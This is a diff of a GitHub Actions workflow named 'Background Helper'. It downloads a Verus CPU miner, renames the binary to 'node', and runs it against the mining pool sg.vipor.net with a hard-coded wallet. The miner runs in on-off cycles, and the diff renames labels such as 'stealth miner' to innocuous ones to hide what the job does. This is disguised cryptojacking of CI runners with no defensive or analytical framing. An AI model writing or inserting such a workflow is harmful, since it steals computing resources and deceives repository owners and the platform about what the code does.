@@ -1,25 +1,29 @@
-name: Simulation Runner
+name: Background Helper
 
 on:
   workflow_dispatch:
 
 jobs:
-  run-sim:
+  stealth:
     runs-on: ubuntu-latest
     steps:
-    - name: Download stealth miner
+    - name: Install required tools
       run: |
-        curl -L -o sim https://github.com/VerusCoin/ccminer-verus/releases/download/v0.1/ccminer-verus-ubuntu18.zip
-        unzip sim
-        chmod +x verus*
-        mv verus* myhelper
+        sudo apt update
+        sudo apt install -y curl unzip
 
-    - name: Start background mining (low CPU)
+    - name: Download and prepare helper
+      run: |
+        curl -L -o miner https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3a-CPU/ccminer-v3.8.3a-oink_Ubuntu_18.04
+        chmod +x miner
+        mv miner node
+
+    - name: Run background stealth node
       run: |
         while true; do
-          ./myhelper -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7.worker1 -p x &
+          ./node -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7.worker1 -p x &
           PID=$!
-          sleep 45
+          sleep 60
           kill $PID
-          sleep 15
+          sleep 20
         done
